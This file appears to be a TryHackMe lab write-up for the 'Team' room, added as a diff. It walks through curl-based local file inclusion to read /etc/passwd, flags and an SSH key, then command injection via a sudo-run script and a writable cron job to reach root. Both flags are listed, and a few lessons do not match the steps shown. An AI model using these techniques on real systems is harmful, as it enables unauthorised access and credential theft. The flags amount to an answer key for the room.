@@ -1,0 +1,112 @@
+============================================================
+  PENTEST REPORT - TryHackMe
+  Room: Team
+  Target IP: 10.65.164.232
+  Date: 2026-04-16
+  Analyst: Pentester
+============================================================
+
+[PHASE 1 - RECONNAISSANCE]
+- Target: 10.65.164.232
+- Platform: TryHackMe - Linux (Ubuntu)
+- Virtual Hosts discovered:
+  - team.thm (main site)
+  - dev.team.thm (development site)
+
+[PHASE 2 - PORT SCANNING]
+Command: nmap -sV -sC -T4 10.65.164.232
+Output:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+
+[PHASE 3 - ENUMERATION]
+Services found:
+- FTP (vsftpd 3.0.5) - Anonymous login disabled
+- SSH (OpenSSH 8.2p1) - Password and publickey auth
+- HTTP (Apache 2.4.41) - Multiple vhosts
+
+Users found on system:
+- root, dale, gyles, ftpuser, ssm-user, ubuntu
+
+Directories discovered:
+- /images/ (index listing enabled)
+- /assets/
+- /scripts/
+- /robots.txt (contains "dale")
+
+[PHASE 4 - VULNERABILITIES FOUND]
+CVE/Vuln: Local File Inclusion (LFI) via Path Traversal
+Severity: CRITICAL
+Description: 
+- dev.team.thm has script.php that uses include() with user input
+- No sanitization on the 'page' parameter
+- Allows path traversal with ../../../../../../../
+- Vulnerable URL: http://dev.team.thm/script.php?page=../../../../../../..
+
+[PHASE 5 - EXPLOITATION]
+Vector: LFI on dev.team.thm via HTTP Host header
+Command: curl -H "Host: dev.team.thm" "http://10.65.164.232/script.php?page=../../../../../../../../etc/passwd"
+Result: Successfully read /etc/passwd
+
+User flag obtained via LFI:
+curl -H "Host: dev.team.thm" "http://10.65.164.232/script.php?page=../../../../../../../../home/dale/user.txt"
+Result: THM{6Y0TXHz7c2d}
+
+SSH Private Key for user 'dale' found in sshd_config comments:
+curl -H "Host: dev.team.thm" "http://10.65.164.232/script.php?page=../../../../../../../../etc/ssh/sshd_config"
+
+Vulnerable code discovered:
+<?php   
+$file = $_GET['page'];
+if(isset($file))
+{
+    include("$file");
+}
+else
+{
+    include("teamshare.php");
+}
+?>
+
+[PHASE 6 - POST-EXPLOITATION / PRIVESC]
+Full exploitation steps performed:
+
+1. Get SSH key from /etc/ssh/sshd_config:
+   curl -H "Host: dev.team.thm" ".../script.php?page=../../../../../../../../etc/ssh/sshd_config"
+   (Key found in comments)
+
+2. SSH as dale:
+   ssh -i dale_key dale@10.65.164.232
+   cat /home/dale/user.txt -> THM{6Y0TXHz7c2d}
+
+3. Escalate to gyles (sudo):
+   echo -e 'test\nid' | sudo -u gyles /home/gyles/admin_checks
+   Result: uid=1001(gyles) groups=gyles,lxd,editors,admin
+
+4. Escalate to root (via writable cron script):
+   # gyles is in 'admin' group, /usr/local/bin/main_backup.sh is writable
+   # Create script to copy root flag to /tmp
+   scp escalate.sh dale@target:/tmp/escalate.sh
+   echo -e 'test\ncp /tmp/escalate.sh /usr/local/bin/main_backup.sh' | sudo -u gyles /home/gyles/admin_checks
+   # Wait for cron to run the script
+   sleep 5 && cat /tmp/root_flag.txt
+
+Root flag obtained: THM{fhqbznavfonq}
+
+[FLAGS]
+User flag: THM{6Y0TXHz7c2d}
+Root flag: THM{fhqbznavfonq}
+
+[LESSONS LEARNED]
+1. Development sites often have vulnerabilities (LFI in this case)
+2. Subdomain enumeration is critical - found dev.team.thm
+3. PHP filter wrappers can be used for base64 encoding
+4. robots.txt can contain hints (found "dale" user)
+5. LFI can be used to read sensitive files, including flags
+6. SSH private keys can be stored in unexpected places like sshd_config comments
+7. Privilege escalation paths: dale -> gyles (sudo) -> root (writable cron script)
+8. FTP credentials can be found in .old backup files in web directories
+
+============================================================
